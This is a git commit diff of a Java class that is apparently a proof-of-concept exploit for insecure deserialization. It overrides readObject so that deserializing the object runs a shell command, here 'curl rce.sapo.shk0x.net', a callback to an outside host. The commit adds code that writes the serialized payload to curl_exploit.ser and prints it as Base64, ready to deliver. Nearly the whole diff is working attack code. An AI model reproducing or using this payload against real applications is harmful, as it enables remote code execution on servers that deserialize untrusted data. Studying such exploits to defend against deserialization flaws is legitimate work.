ed76e1b2da40a3d94da3bacc3ec60eecc9e71543
shk0x <sshk0x@gmail.com>
2024-10-07 16:15:48 -0300

    base funkando con archivo

--- ShellSession.java
+++ ShellSession.java
@@ -1,13 +1,5 @@
-import java.io.BufferedReader;
-import java.io.InputStreamReader;
-import java.io.ObjectOutputStream;
-import java.io.ObjectInputStream;
-import java.io.FileOutputStream;
-import java.io.FileInputStream;
-import java.io.IOException;
-import java.io.Serializable;
+import java.io.*;
 import java.util.Base64;
-
 
 
 public class ShellSession implements Serializable {
@@ -19,19 +11,21 @@ public class ShellSession implements Serializable {
         this.command = command;
     }
 
-    // Sobrescribir el metodo readObject para ejecutar el comando al deserializarse
+
     private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
         in.defaultReadObject();
         try {
             System.out.println("Ejecutando el comando: " + String.join(" ", command));
             Process process = Runtime.getRuntime().exec(command);
 
+            // Leer e imprimir la salida del comando
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
             String line;
             while ((line = reader.readLine()) != null) {
                 System.out.println(line);
             }
 
+            // Leer e imprimir el error del comando (si hay)
             BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));
             while ((line = errorReader.readLine()) != null) {
                 System.err.println(line);
@@ -48,7 +42,7 @@ public class ShellSession implements Serializable {
     }
 
     public static void main(String[] args) {
-        // arreglo de Strings
+        // Comando a ejecutar como un arreglo de Strings
         String[] command = {"/bin/bash", "-c", "curl rce.sapo.shk0x.net"};
 
         ShellSession exploit = new ShellSession(command);
@@ -62,16 +56,35 @@ public class ShellSession implements Serializable {
 
     public static void serialize(Object obj) {
         try {
-            ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream("curl_exploit.ser"));
-            os.writeObject(obj);
-            os.close();
+            // Crear un ByteArrayOutputStream para serializar el objeto a bytes
+            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
+            
+            // Serializar el objeto
+            objectOutputStream.writeObject(obj);
+            objectOutputStream.close();
+
+            // Convertir el objeto serializado a un array de bytes
+            byte[] serializedObjectBytes = byteArrayOutputStream.toByteArray();
+
+            // Codificar el array de bytes a Base64
+            String base64String = Base64.getEncoder().encodeToString(serializedObjectBytes);
+
+            // Mostrar el objeto serializado en Base64
+            System.out.println("Objeto serializado en Base64: " + base64String);
+
+            // Guardar el objeto serializado en un archivo .ser
+            FileOutputStream fileOutputStream = new FileOutputStream("curl_exploit.ser");
+            fileOutputStream.write(serializedObjectBytes);
+            fileOutputStream.close();
+
             System.out.println("Objeto serializado correctamente en curl_exploit.ser");
         } catch (IOException e) {
             e.printStackTrace();
         }
     }
 
-]    public static void deserialize() {
+    public static void deserialize() {
         try {
             ObjectInputStream is = new ObjectInputStream(new FileInputStream("curl_exploit.ser"));
             is.readObject();
